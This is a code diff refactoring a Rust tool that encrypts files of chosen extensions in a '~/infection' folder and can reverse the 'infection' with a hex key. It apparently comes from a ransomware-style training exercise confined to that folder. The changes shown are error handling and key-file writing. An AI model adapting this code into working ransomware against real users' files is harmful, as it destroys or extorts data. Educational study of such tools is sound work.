@@ -1,9 +1,8 @@
-use anyhow::Result;
+use anyhow::{anyhow, Result};
 use clap::Parser;
 use simple_crypt::{decrypt_file, encrypt_file};
 use std::{
-    fs::File,
-    io::Write,
+    fs::{self},
     path::{Path, PathBuf},
 };
 use walkdir::WalkDir;
@@ -26,7 +25,7 @@ const FILE_EXTENSIONS: &[&str] = &[
 ];
 
 #[derive(Parser)]
-#[clap(version)]
+#[clap(version, about)]
 struct Args {
     #[clap(short, long, value_name = "KEY", help = "Reverse the infection")]
     reverse: Option<String>,
@@ -35,7 +34,9 @@ struct Args {
 }
 fn main() -> Result<()> {
     let args = Args::parse();
-    let folder = dirs::home_dir().unwrap().join("infection");
+    let folder = dirs::home_dir()
+        .ok_or(anyhow!("no home dir found"))?
+        .join("infection");
     if let Some(hexkey) = args.reverse {
         let mut key: [u8; 32] = [0; 32];
         hex::decode_to_slice(hexkey, &mut key)?;
@@ -44,8 +45,9 @@ fn main() -> Result<()> {
         let key: [u8; 32] = rand::random();
         let hexkey = hex::encode(key);
         if args.silent {
-            let mut file = File::create("key.txt")?;
-            file.write_all(hexkey.as_bytes())?;
+            // let mut file = File::create("key.txt")?;
+            // file.write_all(hexkey.as_bytes())?;
+            fs::write("key.txt", hexkey)?;
         } else {
             println!("shhhhhhhhhhh, key is {} ...", hex::encode(key));
         }
